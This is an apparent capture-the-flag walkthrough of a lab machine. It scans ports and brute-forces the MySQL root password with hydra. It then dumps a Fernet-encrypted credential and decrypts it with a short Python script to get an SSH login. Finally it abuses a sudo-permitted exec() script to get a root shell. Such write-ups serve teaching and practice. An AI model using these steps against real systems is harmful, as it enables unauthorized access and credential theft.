# MySQL Bruteforcing to Fernet Decryption to Python Exec Calls



Another target. Let’s begin.

```
kali@kali:~/work$ nmap target -p-
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-08 15:55 MST
Nmap scan report for target (target)
Host is up (0.068s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
1337/tcp open  waste
3306/tcp open  mysql
```

Let’s run nmap service discovery to make sure.

```
kali@kali:~/work$ nmap -sV -p 1337,3306 target
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-08 15:57 MST
Nmap scan report for target (target)
Host is up (0.062s latency).

PORT     STATE SERVICE VERSION
1337/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
3306/tcp open  mysql   MySQL 5.5.5-10.3.23-MariaDB-0+deb10u1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Great, OpenSSH and MySQL. No known-to-me vulnerabilities in either. Guess we’re bruteforcing.

```
kali@kali:~/work$ hydra -l root -P rockyou.txt mysql://target
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-11-08 16:10:38
[INFO] Reduced number of tasks to 4 (mysql does not like many parallel connections)
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344400 login tries (l:1/p:14344400), ~3586100 tries per task
[DATA] attacking mysql://target:3306/
[3306][mysql] host: target   login: root   password: prettywoman
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-11-08 16:10:40
```

Sweet, MySQL creds are ‘root’ and ‘prettywoman’. Thanks, I know what I am.

Next up is a bit of a read. I connect to MySQL and poke at the data.

```
kali@kali:~/work$ mysql -u root -pprettywoman -h target --skip-ssl
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 14090
Server version: 10.3.23-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Support MariaDB developers by giving a star at https://github.com/MariaDB/server
Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| data               |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
4 rows in set (0.065 sec)

MariaDB [(none)]> use data;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [data]> show tables;
+----------------+
| Tables_in_data |
+----------------+
| fernet         |
+----------------+
1 row in set (0.062 sec)

MariaDB [data]> describe fernet;
+-------+--------------+------+-----+---------+-------+
| Field | Type         | Null | Key | Default | Extra |
+-------+--------------+------+-----+---------+-------+
| cred  | varchar(255) | YES  |     | NULL    |       |
| keyy  | varchar(255) | YES  |     | NULL    |       |
+-------+--------------+------+-----+---------+-------+
2 rows in set (0.065 sec)

MariaDB [data]> select * from fernet;
+--------------------------------------------------------------------------------------------------------------------------+----------------------------------------------+
| cred                                                                                                                     | keyy                                         |
+--------------------------------------------------------------------------------------------------------------------------+----------------------------------------------+
| gAAAAABfMbX0bqWJTTdHKUYYG9U5Y6JGCpgEiLqmYIVlWB7t8gvsuayfhLOO_cHnJQF1_ibv14si1MbL7Dgt9Odk8mKHAXLhyHZplax0v02MMzh_z_eI7ys= | UJ5_V_b-TWKKyzlErA96f-9aEnQEfdjFbRKt8ULjdV0= |
+--------------------------------------------------------------------------------------------------------------------------+----------------------------------------------+
1 row in set (0.062 sec)

MariaDB [data]> quit;
Bye
```

Alright, we copy these fields into two different files named fernet.cred and fernet.key.

But what is Fernet? Certainly they don’t mean an Italian liquor. Turns out, it’s, and I quote, “Fernet is an implementation of symmetric authenticated cryptography”. The article I read goes on to explain it uses AES in CBC mode with a 128-bit key for encryption with PKCS7 padding along with HMAC and SHA256 for authentication.

It has a Python implementation, so let’s use that and write some code.

```
#!/usr/bin/env python3
import sys
from cryptography.fernet import Fernet


def main():
    keyfile = open(sys.argv[1])
    credfile = open(sys.argv[2])

    key = keyfile.readline().strip()
    cred = credfile.readline().strip()

    keyfile.close()
    credfile.close()

    decryptor = Fernet(key)
    clearcreds = decryptor.decrypt(cred).decode()

    print('Creds: {}'.format(clearcreds))


if __name__ == '__main__': main()
```

Here, we open and read each respective file and simply plug that data into the Python Fernet library and print the results.

```
kali@kali:~/work$ ./decrypt fernet.key fernet.cred 
Creds: lucy:wJ9`"Lemdv9[FEw-
```

Let’s try to SSH with that.

```
kali@kali:~/work$ ssh -p 1337 lucy@target
lucy@target's password: 
Linux pyexp 4.19.0-10-amd64 #1 SMP Debian 4.19.132-1 (2020-07-24) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
lucy@pyexp:~$
```

Alright! Now we’re getting somewhere. What do our sudo privs look like?

```
lucy@pyexp:~$ sudo -l
Matching Defaults entries for lucy on pyexp:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User lucy may run the following commands on pyexp:
    (root) NOPASSWD: /usr/bin/python2 /opt/exp.py
```

So we can run ‘sudo /usr/bin/python2 /opt/exp.py’ and nothing else.

Let’s take a look at /opt/exp.py and hope it’s exploitable.

```
lucy@pyexp:~$ cat /opt/exp.py 
uinput = raw_input('how are you?')
exec(uinput)
```

So it just asks for user input then executes it?

It just straight up gives us Python command injection?

```
lucy@pyexp:~$ sudo /usr/bin/python2 /opt/exp.py
how are you?import os; os.system('/bin/bash')
root@pyexp:/home/lucy# id
uid=0(root) gid=0(root) groups=0(root)
```

And it does! We’re root!
